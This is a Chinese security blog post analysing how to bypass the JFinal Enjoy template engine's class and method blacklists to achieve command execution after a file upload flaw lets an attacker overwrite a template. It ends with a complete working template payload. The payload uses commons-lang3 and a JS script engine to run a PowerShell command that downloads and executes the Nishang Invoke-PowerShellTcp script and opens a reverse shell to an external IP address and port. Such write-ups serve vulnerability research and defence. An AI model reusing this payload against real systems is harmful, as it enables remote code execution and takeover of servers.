---
typora-root-url: ../../../static
title: "JFinal Enjoy Template Engine命令执行绕过分析"
date: 2021-03-07T22:07:36+08:00
draft: false
categories: ["security"]
---

## 分析
上周代码审计一个系统，发现系统是基于JFinal框架，是一个国产比较出名的框架（还挺好用），JFinal默认不支持直接访问jsp，系统使用的官方的Enjoy模板引擎。

当时发现了一个文件上传漏洞，可以覆盖系统中的存在的模板文件，于是想通过模板引擎执行命令，但是发现Enjoy存在一些安全防护，如下所示，是Enjoy的一些黑名单：

类黑名单：

![Enjoy类黑名单][p1]

方法黑名单：

![Enjoy方法黑名单][p2]

当时查看官方文档，发现Enjoy模板引擎，只能直接调用Java中的静态方法，如果想调用实例方法，只有配置了sharedObject或者render模板视图之前set了Object才能调用对象的实例方法，不能直接new一个对象来调用；于是现在就是根据如下条件，来达到命令执行的目的：

- 只能调用公共静态方法；
- 不能调用类黑名单中的类；
- 不能调用方法黑名单中的方法；

不使用new的方式，常用的依赖于JDK来达到命令执行的方法，无非就是通过反射或类加载器来实例化ProcessBuilder对象来执行命令，或者通过反射调用java.lang.Runtime的exec()方法来执行命令；但是无论是通过反射还是类加载器，经过我大量测试，根本绕不过黑名单（不仅存在类名单，还存在方法黑名单，实在是难顶）。

最终，突然灵机一闪！我为何要使用JDK中的API呢！！！于是我直接 **查看系统中使用了哪些第三方依赖** ，发现使用了commons-lang3，好家伙，就是你了！这个工具包中存在很多类似ClassUtils等工具，完全可以使用这些工具类来绕过黑名单。

## Payload
这里提供我写的一个利用commons-lang3绕过的payload，其中一些说明如下：

- 利用 `java.net.URLClassLoader` 绕过 `ClassLoader` 黑名单；
- 利用 `ScriptEngineManager` 获取JS脚本引擎，通过 `eval()` 动态执行 `java.lang.Runtime.getRuntime().exec()` ,来执行命令；

以下是完整的payload（作用是windows下反弹powershell）： 

	#set(x=(java.net.URLClassLoader::getSystemClassLoader()).loadClass("javax.script.ScriptEngineManager"))
	#set(payload="powershell -nop -exec bypass -c \\"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp  -Reverse -IPAddress 49.234.105.98 -Port 7777\\"")
	#set(poc="java.lang.Runtime.getRuntime().exec(\""+payload+"\")")
	#((org.apache.commons.lang3.reflect.ConstructorUtils::invokeConstructor(x)).getEngineByExtension("js").eval(poc))









[p1]:/media/2021-03-07-1.png
[p2]:/media/2021-03-07-2.png